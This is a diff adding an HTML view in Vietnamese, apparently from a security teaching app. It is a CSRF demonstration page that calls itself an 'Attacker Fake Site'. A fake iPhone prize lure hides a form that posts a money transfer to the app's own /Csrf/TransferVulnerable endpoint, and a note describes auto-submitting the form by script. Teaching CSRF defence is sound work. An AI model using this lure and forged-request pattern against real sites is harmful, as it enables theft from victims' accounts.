@@ -1,0 +1,36 @@
+@{
+    Layout = null;
+}
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8" />
+    <title>🎁 CHÚC MỪNG BẠN ĐÃ TRÚNG THƯỞNG IPHONE 16 PRO MAX! (Attacker Fake Site)</title>
+    <link rel="stylesheet" href="~/lib/bootstrap/dist/css/bootstrap.min.css" />
+</head>
+<body class="bg-danger bg-opacity-10 py-5">
+    <div class="container text-center">
+        <div class="card shadow-lg p-5 border-danger mx-auto" style="max-width: 650px;">
+            <h2 class="text-danger fw-bold">🎉 CHÚC MỪNG BẠN ĐÃ TRÚNG THƯỞNG!</h2>
+            <p class="fs-5 text-secondary">
+                Bạn là khách hàng may mắn thứ 1.000.000 nhận được phần quà trị giá 35.000.000 VNĐ.
+            </p>
+            <div class="alert alert-warning text-dark fw-bold">
+                ⚠️ CẢNH BÁO MINH CHỨNG CSRF: Trang web này đang chứa một form ẩn tự động gửi request rút 20.000.000 VNĐ từ ví nạn nhân sang ví hacker!
+            </div>
+
+            <!-- FORM ẨN TỰ ĐỘNG GỬI SANG HỆ THỐNG MỤC TIÊU -->
+            <form id="csrfExploitForm" action="/Csrf/TransferVulnerable" method="post">
+                <input type="hidden" name="amount" value="20000000" />
+                <button type="submit" class="btn btn-danger btn-lg fw-bold w-100 py-3 shadow">
+                    🎁 BẤM VÀO ĐÂY ĐỂ NHẬN THƯỞNG NGAY (Kích Hoạt CSRF)!
+                </button>
+            </form>
+
+            <div class="mt-4 text-muted small">
+                * Trong thực tế, kẻ tấn công thậm chí có thể dùng script tự động <code>document.getElementById('csrfExploitForm').submit()</code> ngay khi nạn nhân vừa mở trang web này mà không cần bấm nút!
+            </div>
+        </div>
+    </div>
+</body>
+</html>
